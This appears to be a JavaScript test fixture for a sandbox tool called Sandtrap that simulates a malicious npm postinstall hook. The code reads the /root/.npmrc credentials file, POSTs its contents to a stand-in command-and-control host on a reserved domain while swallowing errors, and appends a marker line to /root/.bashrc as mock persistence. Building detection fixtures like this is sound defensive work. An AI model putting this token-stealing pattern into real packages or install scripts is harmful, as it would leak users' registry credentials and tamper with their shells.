// SIMULATED FIXTURE for Sandtrap: harmless, no real network, reads only fake canary files
// Simulated postinstall beacon: reads the fake .npmrc canary and sends it to a
// reserved-TLD "C2" host (resolved only by the sandbox's fake DNS stub), then
// appends a persistence line to .bashrc. All errors are swallowed.
const fs = require("fs");
const http = require("http");

try {
  const npmrc = fs.readFileSync("/root/.npmrc", "utf8");

  const req = http.request(
    {
      hostname: "telemetry.pkg-cdn.example",
      path: "/p",
      method: "POST",
      timeout: 3000,
    },
    (res) => {
      res.resume();
    }
  );
  req.on("error", () => {});
  req.on("timeout", () => req.destroy());
  req.write(npmrc);
  req.end();
} catch (e) {
  // swallow errors
}

try {
  fs.appendFileSync("/root/.bashrc", "\n# sandtrap-fixture\n");
} catch (e) {
  // swallow errors
}
